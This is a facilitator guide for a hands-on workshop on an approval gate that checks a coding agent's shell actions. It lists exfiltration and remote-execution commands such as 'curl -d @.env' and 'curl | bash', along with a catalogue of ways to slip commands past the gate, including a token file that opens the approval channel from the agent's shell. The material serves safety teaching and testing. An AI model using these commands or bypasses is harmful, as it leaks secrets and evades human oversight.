# Workshop mode — "Five requests. Three checks. Your call."

Facilitator guide for the 60-minute hands-on session.

**Run it:**

```bash
python3 workshop/workshop.py
```

Python 3.9+. No Claude Code, no account, no API key, no network. A browser tab
opens on `127.0.0.1` with a per-session token. Nothing participants type is
executed.

`gate/` is not modified. Everything in this folder reads the engine; it never
changes it.

---

## The one thing it teaches

Three checks, on screen the whole hour:

1. What will it actually do?
2. Where does it go — does anything leave this machine, or run from somewhere else?
3. Can I undo it?

Everything else is in service of those.

---

## Run of show (60 minutes, setup included)

| Time | What happens |
| --- | --- |
| 0–10 | Teach the three checks. Demo `curl \| bash` on the projector, once without the gate and once with it. **Participants clone and start the server while you talk** — leave the two commands on the slide the whole time. |
| 10–30 | Round 1: the five requests, in pairs. |
| 30–43 | Round 2: find one the gate misses. Pairs compete. |
| 43–55 | Discuss requests 4 and 5 together, and the best finds. |
| 55–60 | Recap the three checks. Fork and open an issue, if people want to. |

Setup runs underneath the opening talk rather than before it. The clone is
129 KB, so bandwidth is not the cost — the cost is the handful of people with
no git, no Python, or a locked-down work laptop, and those get solved by
pairing, not by waiting. Say "one laptop per pair is fine" early and mean it.

---

## Round 1: the five requests

The arc matters more than any single item: the gate helps, then the gate is
not enough, then the gate is not there.

| # | Request | Gate asks | Right call | Teaches |
| --- | --- | --- | --- | --- |
| 1 | `pip install requests` | 2 questions | Approve | A question firing is not a problem. If every prompt felt dangerous, people would stop reading them. |
| 2 | `curl -sSL … \| bash` | 2 questions | Send back | Check 2. Nothing is saved or shown; whoever controls that host decides what runs, at the moment it runs. |
| 3 | `git add . && git commit` | 1 question, top priority | Send back | Check 3. `.env` is not gitignored. Undo means rotating every key, not reverting a commit. |
| 4 | `pip install reqeusts` | 2 questions | Send back | **The gate does not help.** Both questions are answerable perfectly while installing a typosquat. It checks comprehension of the action, not whether the action is right. |
| 5 | `curl -X POST -d @.env …` | **nothing** | Send back | **The gate is silent.** Its download detector bails as soon as curl is sending rather than fetching. It watches what arrives and what is destroyed, never what leaves. |

Questions are generated live by `gate/actions.py: questions_for_action`
against a throwaway fixture project (a real `.env` that is not gitignored, a
git repo with a remote, a `build/` directory). They are not hard-coded here,
so if you change a detector the workshop changes with it.

**Do not read option letters aloud.** The live page shuffles option order from
a per-session secret, so every laptop in the room sees a different letter for
the same answer. `CARDS.md` has fixed letters because paper cannot shuffle.
Say the answer, never "it's C."

**Facilitator note on 4 and 5.** These are the session. Do not rescue people
who approve them — the reveal does that, and it lands harder after a wrong
call. The line to land in the discussion: *no question is not the same as no
problem.*

---

## Round 2: find one it misses

A text box. Type a command, the real engine parses it, the page shows which
questions fire — or logs a find if none do. Silent commands accumulate in a
list so you can read the best ones out at the end.

Known-silent, so you can tell whether a pair found something new:

- uploads and copies of secrets — `curl -d @.env …`, `cat .env`, `cp .env …`, `tar czf … .env`, `env | curl -d @- …`
- indirect execution — `eval "$(curl …)"`, backticks, `sh -c '…'` in single quotes, a heredoc into `bash`, `base64 -d | sh`, `python3 -c "…"`
- remote runners — `npx`, `uvx`
- deletes that are not `rm` — `find … -delete`, `shutil.rmtree`, brace expansion `rm -rf {build,dist}`
- a trailing `# comment` after `rm -rf build/`
- `git config core.hooksPath …`
- any command with an unbalanced quote earlier in it: the parser gives up and everything after it goes unchecked

If a pair makes the engine **raise an exception**, that beats all of the
above. In the real gate that exception is swallowed and the action is allowed
through. 60,000 fuzzed commands did not find one; if somebody does, it is the
finding of the day.

What is deliberately **not** in this round, because workshop mode replaces the
daemon and the page: the gate can be opened by elimination (wrong answers are
free, four clicks maximum), and the approval channel is reachable from the
agent's own shell via the token in `~/.sp1/daemon.json`. Put both on the table
yourself at the start. Somebody in that room will think of them, and it is
better coming from you.

---

## If the technology fails

`CARDS.md` runs the whole session on paper, one set per pair. Print it before
you travel. Both rounds work without a laptop; only the live engine is lost,
and in round 2 you become the engine.

---

## What this does not do

Workshop mode is a teaching harness, not the product. It does not hook into a
coding agent, hold a real action, or run the daemon. That is `gate/`, and it
needs a paid Claude Code setup per laptop — the one property of the real thing
that does not survive a conference room.
